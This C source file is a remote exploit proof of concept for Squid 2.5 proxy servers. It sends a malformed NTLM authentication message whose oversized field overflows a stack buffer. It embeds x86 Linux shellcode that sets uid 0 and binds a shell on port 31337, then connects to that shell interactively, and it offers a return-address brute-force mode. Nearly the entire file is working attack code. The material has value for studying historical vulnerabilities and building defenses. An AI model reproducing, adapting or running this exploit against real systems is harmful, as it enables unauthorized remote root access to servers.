/*
	SQUID 2.5.*-STABLE Remote Exploit ver 2.00 PoC
	Private Source Code Material
	The Eye on Security Research Group - India
	20.6.2004

	http://www.eos-india.net/abhisek/
*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>

#define	STACK_TOP	0xbfffff00	// No need to go any furthur
#define RET_START	0xbff00000
#define	NOP		0x90
#define NOP_SLED	0xff
#define	INVALID_SOCKET	-1
#define	MAX_ARCH	1
#define	SHELL_PORT	31337
#define NTLM_INIT       0x01000000
#define NTLM_AUTH       0x03000000
#define NTLM_OEM        0x00000002
#define NTLM_REQUEST    0x00000004
#define NTLM_NEGOTIATE  0x00000200
#define DOMAIN_SUPPLIED 0x00001000
#define NTLM_SIGNATURE  "NTLMSSP"
#define PADDING         0xff
#define DEFAULT_RETLOC  28+4    /* Includes gcc 3.x padding.. Most optimum */
#define MAX_RETLOC      40 /* Tested in most Linux+gcc */
#define MAX_DATA_SIZE   (MAX_RETLOC+4+PADDING+sizeof(shellcode)+1)
#define MAX_BUFF_SIZE   (MAX_DATA_SIZE+1024)


/*
 x86 linux portbind a shell in port 31337
 based on shellcode from www.shellcode.com.ar
 with a few modifications by us
*/
char shellcode[]=
        /* sys_fork() */
	"\x31\xc0"                      // xorl         %eax,%eax
	"\x31\xdb"                      // xorl         %ebx,%ebx
	"\xb0\x02"                      // movb         $0x2,%al
	"\xcd\x80"                      // int          $0x80
	"\x38\xc3"                      // cmpl         %ebx,%eax
	"\x74\x05"                      // je           0x5
	/* sys_exit() */
	"\x8d\x43\x01"                  // leal         0x1(%ebx),%eax
	"\xcd\x80"                      // int          $0x80
        /* setuid(0) */
        "\x31\xc0"                      // xorl         %eax,%eax
        "\x31\xdb"                      // xorl         %ebx,%ebx
        "\xb0\x17"                      // movb         $0x17,%al
        "\xcd\x80"                      // int          $0x80
        /* socket() */
        "\x31\xc0"                      // xorl    %eax,%eax
        "\x89\x45\x10"                  // movl    %eax,0x10(%ebp)(IPPROTO_IP = 0x0)
        "\x40"                          // incl    %eax
        "\x89\xc3"                      // movl    %eax,%ebx(SYS_SOCKET = 0x1)
        "\x89\x45\x0c"                  // movl    %eax,0xc(%ebp)(SOCK_STREAM = 0x1)
        "\x40"                          // incl    %eax
        "\x89\x45\x08"                  // movl    %eax,0x8(%ebp)(AF_INET = 0x2)
	"\x8d\x4d\x08"                  // leal    0x8(%ebp),%ecx
        "\xb0\x66"                      // movb    $0x66,%al
        "\xcd\x80"                      // int     $0x80
        "\x89\x45\x08"                  // movl    %eax,0x8(%ebp)

        /* bind()*/
        "\x43"                          // incl    %ebx(SYS_BIND = 0x2)
        "\x66\x89\x5d\x14"              // movw    %bx,0x14(%ebp)(AF_INET = 0x2)
	"\x66\xc7\x45\x16\x7a\x69"      // movw    $0x697a,0x16(%ebp)(port=31337)
        "\x31\xd2"                      // xorl    %edx,%edx
        "\x89\x55\x18"                  // movl    %edx,0x18(%ebp)
        "\x8d\x55\x14"                  // leal    0x14(%ebp),%edx
        "\x89\x55\x0c"                  // movl    %edx,0xc(%ebp)
        "\xc6\x45\x10\x10"              // movb    $0x10,0x10(%ebp)(sizeof(struct sockaddr) = 10h = 16)
        "\xb0\x66"                      // movb    $0x66,%al
        "\xcd\x80"                      // int     $0x80
 
        /* listen() */
        "\x40"                          // incl    %eax
        "\x89\x45\x0c"                  // movl    %eax,0xc(%ebp)
        "\x43"                          // incl    %ebx
        "\x43"                          // incl    %ebx(SYS_LISTEN = 0x4)
        "\xb0\x66"                      // movb    $0x66,%al
        "\xcd\x80"                      // int     $0x80
 
        /* accept() */
        "\x43"                          // incl    %ebx
        "\x89\x45\x0c"                  // movl    %eax,0xc(%ebp)
        "\x89\x45\x10"                  // movl    %eax,0x10(%ebp)
        "\xb0\x66"                      // movb    $0x66,%al
        "\xcd\x80"                      // int     $0x80
        "\x89\xc3"                      // movl    %eax,%ebx
 
        /* dup2() */
        "\x31\xc9"                      // xorl    %ecx,%ecx
        "\xb0\x3f"                      // movb    $0x3f,%al
        "\xcd\x80"                      // int     $0x80
        "\x41"                          // incl    %ecx
        "\x80\xf9\x03"                  // cmpb    $0x3,%cl
        "\x75\xf6"                      // jne     -0xa
 
        /* execve() */
        "\x31\xd2"                      // xorl    %edx,%edx
        "\x52"                          // pushl   %edx
        "\x68\x6e\x2f\x73\x68"          // pushl   $0x68732f6e
        "\x68\x2f\x2f\x62\x69"          // pushl   $0x69622f2f
        "\x89\xe3"                      // movl    %esp,%ebx
        "\x52"                          // pushl   %edx
        "\x53"                          // pushl   %ebx
        "\x89\xe1"                      // movl    %esp,%ecx
        "\xb0\x0b"                      // movb    $0xb,%al
        "\xcd\x80";                     // int     $0x80

/* Base64 encoding code from Monit */
static char encode(unsigned char u) {
  if(u < 26)  return 'A'+u;
  if(u < 52)  return 'a'+(u-26);
  if(u < 62)  return '0'+(u-52);
  if(u == 62) return '+';
  return '/';
}

int allowed(unsigned char byte)
{
	return byte;
}

void
fixnull(unsigned long *addr)
{
        unsigned char  byte1, byte2, byte3, byte4;

        byte1 = (*addr >> 24) & 0xFF;

        if (!allowed(byte1)) {
                while (!allowed(++byte1));
                *((unsigned char *)addr + 3) = byte1;
                *((unsigned char *)addr + 2) = 0;
                *((unsigned char *)addr + 1) = 0;
                *((unsigned char *)addr + 0) = 0;
        }
        byte2 = (*addr >> 16) & 0xFF;
        if (!allowed(byte2)) {
                while(!allowed(++byte2));
                *((unsigned char *)addr + 2) = byte2;
                *((unsigned char *)addr + 1) = 0;
                *((unsigned char *)addr + 0) = 0;
        }
        byte3 = (*addr >> 8) & 0xFF;
        if (!allowed(byte3)) {
                while (!allowed(++byte3));
                *((unsigned char *)addr + 1) = byte3;
                *((unsigned char *)addr + 0) = 0;
        }
        byte4 = (*addr) & 0xFF;
        if (!allowed(byte4)) {
                while (!allowed(++byte4));
                *((unsigned char *)addr) = byte4;
        }
}

char *encode_base64(unsigned char *src,int size) {
  	int 	i;
  	char 	*out, *p;

  	if(!src)
    		return NULL;
  	if(!size)
    		size= strlen((char *)src);
  	out=(char *)malloc(sizeof(char)*size*4/3+4);
  	p=out;
  	for(i=0; i<size; i+=3) {
    		unsigned char b1=0, b2=0, b3=0, b4=0, b5=0, b6=0, b7=0;
    		b1 = src[i];
    		if(i+1<size)
      			b2=src[i+1];

    		if(i+2<size)
      			b3=src[i+2];
    		b4= b1>>2;
    		b5=((b1&0x3)<<4)|(b2>>4);
    		b6=((b2&0xf)<<2)|(b3>>6);
    		b7= b3&0x3f;
    		*p++=encode(b4);
    		*p++=encode(b5);
    		if(i+1<size) {
      			*p++=encode(b6);
    		} else {
      			*p++='=';
    		}
    		if(i+2<size) {
      			*p++=encode(b7);
    		} else {
      			*p++='=';
    		}
	}
  	return out;
}

typedef	struct ntlm_security_buffer {
	unsigned short	buff_length;
	unsigned short	buff_alloc;
	unsigned long	offset;
} NTLM_SB;

typedef	struct ntlm_message_1 {
	char		sig[8];
	unsigned long	type;
	unsigned long	flags;
	NTLM_SB		domain;
	NTLM_SB		workstation;
	char		data[16];	// Blah.. not required
} NTLM_MSG1;

typedef	struct	pseudo	{
	char		user[16];
	char		domain[16];
	char            data[MAX_DATA_SIZE];
} NTLM_PSEUDO;

typedef	struct ntlm_message_3 {
	char		sig[8];
	unsigned long	type;
	NTLM_SB		lm_response;
	NTLM_SB		ntlm_reponse;
	NTLM_SB		domain_name;
	NTLM_SB		user_name;
	NTLM_SB		workstation;
	NTLM_SB		session_key;
	unsigned long	flags;
	NTLM_PSEUDO	xdata;
	
} NTLM_MSG3;

void g_shell(int sockfd) {
	fd_set		fds;
	char		buff[1024];
	int 		n;
	
	while(1) {
		FD_ZERO(&fds);
		FD_SET(sockfd,&fds);
		FD_SET(fileno(stdin),&fds);

		if(select((sockfd>fileno(stdin)?sockfd:fileno(stdin))+1,&fds,NULL,NULL,NULL)<0)
			return;
		if(FD_ISSET(sockfd,&fds)) {
			n=read(sockfd,buff,sizeof(buff));
			if(n<=0) {
				if(errno==EINTR||errno==EAGAIN)
					continue;
				else
					break;
			}
			write(fileno(stdout),buff,n);
		}

		if(FD_ISSET(fileno(stdin),&fds)) {
			n=read(fileno(stdin),buff,sizeof(buff));
			if(n<=0) {
				if(errno==EINTR||errno==EAGAIN)
					continue;
				else
					break;
			}
			write(sockfd,buff,n);
		}
	}
}

int xconnect(char *hostname,int port) {
	struct sockaddr_in 	sin;
	struct hostent		*host;
	int			sockfd;

	if(NULL==(host=gethostbyname(hostname))) {
		perror("gethostbyname");
		return INVALID_SOCKET;
	}

	sin.sin_addr=*((struct in_addr*)host->h_addr_list[0]);
	sin.sin_port=htons(port);
	sin.sin_family=AF_INET;

	if((sockfd=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))<0) {
		perror("socket");
		return INVALID_SOCKET;
	}

	if(connect(sockfd,(struct sockaddr*)&sin,sizeof(sin))) {
		perror("connect");
		return INVALID_SOCKET;
	}

	return sockfd;	// we are connected :-)
}

void usage(char *prog) {
	int 	i;
	printf("----------------------------------\n");
	printf("The Eye On Security Research Group\n");
	printf("           India\n");
	printf("SQUID 2.5.*-STABLE Remote Exploit\n");
	printf("----------------------------------\n");
	printf("\n");
	printf("[Usage]\n");
	printf("%s -h [Remote Host] -p [Remote Port] -o [Ret Offset] -r [Return Address] -b\n\n",prog);
	printf("Use -b option for bruteforcing..\n");
	exit(0);
}



void XPL_Make(char *buffer,size_t size,unsigned int retloc,unsigned long ret) {
	unsigned int	ctr;
	int		n;
	char		*ptr;
	memset(buffer,0x00,size);
	memset(buffer,0x41,retloc);	// Crap

	ptr=buffer+strlen(buffer);
	memcpy(ptr,&ret,sizeof(ret));
	ptr=buffer+strlen(buffer);
	memset(ptr,0x90,PADDING);
	ptr=buffer+strlen(buffer);
	n=size-(strlen(buffer)+strlen(shellcode)+1);
	if(n>0) {
		memset(ptr,0x90,n);
		ptr=buffer+strlen(buffer);
	}
	memcpy(ptr,shellcode,strlen(shellcode));
}

void do_xp(unsigned long ret,unsigned int retloc,int port,char *hostname) {
	int		sockfd;
	unsigned int    i;
	int             n=0;
	char		buffer[MAX_BUFF_SIZE];
	char            *encoded_buff;
	NTLM_MSG1       msg1;
	NTLM_MSG3       msg3;
	
	printf("+ Connecting to %s:%d\t",hostname,port);
	if((sockfd=xconnect(hostname,port))==INVALID_SOCKET) {
		printf("[FAILED]\n");
		exit(1);
	}
	printf("[DONE]\n");
	/* NTLM Type 1 Message */
	bzero(&msg1,sizeof(msg1));
	strcpy(msg1.sig,NTLM_SIGNATURE);
	msg1.type=NTLM_INIT;
	msg1.flags=NTLM_OEM|NTLM_REQUEST|NTLM_NEGOTIATE;
	
	/* Send NTLM Type 1 Message */
	bzero(buffer,sizeof(buffer));
	encoded_buff=encode_base64((u_char*)&msg1,sizeof(msg1));
	n=snprintf(buffer,sizeof(buffer),	\
		"GET http://www.eos-india.net HTTP/1.1\r\n"
		"Proxy-Authorisation: NTLM %s\r\n\r\n",encoded_buff);
	printf("+ Sending NTLM Type 1 Message\t");
	if(send(sockfd,buffer,n,0)!=n) {
		printf("- [FAILED]\n");
		close(sockfd);
		exit(1);
	}
	printf("[DONE]\n");

	/* Receive NTLM Type 2 Message from server */
	bzero(buffer,sizeof(buffer));
	recv(sockfd,buffer,sizeof(buffer),0);
	for(i=0;i<strlen(buffer);i++) {	// we need the first line only
		if(buffer[i]=='\r'||buffer[i]=='\n') {
			buffer[i]=0x00;
			break;
		}
	}
	if(!strstr(buffer,"407")) {
		printf("- Invalid response from server.\n");
		close(sockfd);
		exit(1);
	}

	/* NTLM Type 3 Message */
	bzero(&msg3,sizeof(msg3));
	strcpy(msg3.sig,NTLM_SIGNATURE);
	msg3.type=NTLM_AUTH;
	msg3.lm_response.buff_length=MAX_DATA_SIZE; /* overflow */
	msg3.lm_response.buff_alloc=MAX_DATA_SIZE; /* overflow */
	msg3.lm_response.offset=sizeof(msg3)-MAX_DATA_SIZE;
	msg3.domain_name.buff_length=16;
	msg3.domain_name.buff_alloc=16;
	msg3.domain_name.offset=sizeof(msg3)-MAX_DATA_SIZE-16;
	msg3.user_name.buff_length=16;
	msg3.user_name.buff_alloc=16;
	msg3.user_name.offset=sizeof(msg3)-MAX_DATA_SIZE-16-16;
	
	strcpy(msg3.xdata.user,"Blah");
	strcpy(msg3.xdata.domain,"eos-india.net");
	XPL_Make(msg3.xdata.data,MAX_DATA_SIZE,retloc,ret);
	
	/* Sending NTLM Type 3 Message */
	bzero(buffer,sizeof(buffer));
	encoded_buff=encode_base64((u_char*)&msg3,sizeof(msg3));
	n=snprintf(buffer,sizeof(buffer),
		"GET http://www.h4xors.net HTTP/1.1\r\n",
		"Proxy-Authorisation: NTLM %s\r\n\r\n",encoded_buff);
	printf("+ Sending NTLM Type 3 Message [Evil]\t");
	if(send(sockfd,buffer,n,0)!=n) {
		printf("[FAILED]\n");
		close(sockfd);
		exit(1);
	}
	printf("[DONE]\n");
	close(sockfd);
	printf("+ Attempting to connect to - %s:%d\t",hostname,SHELL_PORT);
	sockfd=xconnect(hostname,SHELL_PORT);
	if(sockfd==INVALID_SOCKET) {
		printf("[FAILED]\n");
		return;
	}
	printf("[CONNECTED]\n");
	g_shell(sockfd);
}
	
int main(int argc,char *argv[]) {
	unsigned long	ret=0xbadc0ded;
	unsigned int	retloc=DEFAULT_RETLOC;
	int		port=8080;
	int		brute=0x00;
	char		hostname[128]="localhost";
	unsigned int	i;	
	unsigned int	n;
	char		ch;

	if(argc<3)
		usage(argv[0]);
	
	while((ch=getopt(argc,argv,"h:p:r:o:b"))!=EOF) {
		switch(ch) {
			case 'h':
				snprintf(hostname,sizeof(hostname)-1,"%s",optarg);
				hostname[sizeof(hostname)]=0x00;
				break;
			case 'p':
				port=atoi(optarg);
				if((port<0)||(port>65535)) {
					printf ("- Invalid port..\n");
					exit(1);
				}
				break;
			case 'r':
				ret=strtoul(optarg,NULL,16);
				break;
			case 'o':
				retloc=atoi(optarg);
				if(((unsigned int)retloc<0)||((unsigned int)retloc>MAX_RETLOC)) {
					printf("- Retloc is not feasible.. Try something within %d\n",MAX_RETLOC);
					exit(1);
				}
				break;
			case 'b':
				brute=1;
				break;
			default:
				usage(argv[0]);
				break;
		}
	}
	printf ("+ Hostname: %s\n"
		"+ Port: %d\n"
		"+ Retloc: %d\n", hostname, port, retloc);

	if(brute) {
		printf ("** Brute Force Mode **\n");
		ret=RET_START;
		for(;ret<STACK_TOP;ret+=(NOP_SLED-12)) {
			printf("Orignal ret:0x%x\n",ret);
			fixnull(&ret);
			printf ("+ Using ret=0x%x..\n",ret);
			do_xp(ret,retloc,port,hostname);
		}
		exit(0);
	}

	do_xp(ret,retloc,port,hostname);

	return 0;
}
	

	
	
